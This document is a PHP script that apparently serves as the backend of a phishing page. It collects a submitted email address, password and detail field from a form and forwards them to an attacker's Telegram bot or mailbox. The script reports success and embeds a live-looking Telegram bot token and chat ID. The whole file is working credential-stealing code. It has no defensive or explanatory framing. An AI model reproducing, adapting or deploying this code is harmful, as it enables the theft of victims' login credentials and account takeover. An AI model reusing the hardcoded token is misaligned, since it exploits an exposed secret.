<?php
// Configuration options
// 1 - Send both to Telegram and email
// 2 - Send only to Telegram
// 3 - Send only to email
$config = 2; // Change this value based on your preference

// Telegram configuration
$telegramBotToken = '2106694195:AAGrBEtkVWBAk7deGVkvOEvqXWapNRPkhXs';
$telegramChatId = '1813243185';

// Email configuration
$emailTo = 'example@example.com';
$emailSubject = 'New Submission';
$emailHeaders = 'From: no-reply@example.com' . "\r\n" . 
                 'Reply-To: no-reply@example.com' . "\r\n" . 
                 'X-Mailer: PHP/' . phpversion();

// Collect input data with sanitization
$ai = filter_var($_POST['ai'] ?? '', FILTER_SANITIZE_EMAIL);
$pr = filter_var($_POST['pr'] ?? '', FILTER_SANITIZE_STRING);
$detail = filter_var($_POST['detail'] ?? '', FILTER_SANITIZE_STRING);

// Basic validation
if (!filter_var($ai, FILTER_VALIDATE_EMAIL)) {
    echo 'Invalid email address.';
    exit;
}

// Prepare message
$message = "AI Email: $ai\nPassword: $pr\nDetail: $detail";

// Function to send message to Telegram
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postFields),
        ],
    ];
    $context  = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
    if ($response === FALSE) {
        error_log('Telegram API request failed.');
    }
}

// Function to send email
function sendEmail($message, $to, $subject, $headers) {
    $result = mail($to, $subject, $message, $headers);
    if (!$result) {
        error_log('Failed to send email.');
    }
}

// Handle sending based on configuration
if ($config == 1) {
    // Send both to Telegram and email
    sendToTelegram($message, $telegramBotToken, $telegramChatId);
    sendEmail($message, $emailTo, $emailSubject, $emailHeaders);
} elseif ($config == 2) {
    // Send only to Telegram
    sendToTelegram($message, $telegramBotToken, $telegramChatId);
} elseif ($config == 3) {
    // Send only to email
    sendEmail($message, $emailTo, $emailSubject, $emailHeaders);
}

// Provide feedback
echo 'Details sent successfully. TESTING TOUR';
?>
